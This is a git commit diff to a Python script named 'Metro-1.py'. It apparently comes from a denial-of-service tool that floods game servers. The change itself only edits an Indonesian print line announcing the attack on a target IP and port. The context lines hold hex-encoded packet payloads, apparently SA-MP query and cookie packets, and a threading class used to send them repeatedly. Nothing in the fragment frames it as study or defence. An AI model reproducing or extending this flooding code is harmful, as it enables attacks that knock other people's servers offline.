bd3786f5044c40b31e0677c3a9f1ee3a50ff5319
KingAttackError404 <135358752+KingAttackError404@users.noreply.github.com>
2023-06-15 17:58:53 +0700

    Update Metro-1.py

--- Metro-1.py
+++ Metro-1.py
@@ -23,7 +23,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                        ]
 
-print(" Menyerang Ip >%s Dan Port >%s"%(orgip,port))
+print(" Pablo Sedang Menyerang Ip >%s Dan Port >%s"%(orgip,port))
 
 class MyThread(threading.Thread):
      def run(self):
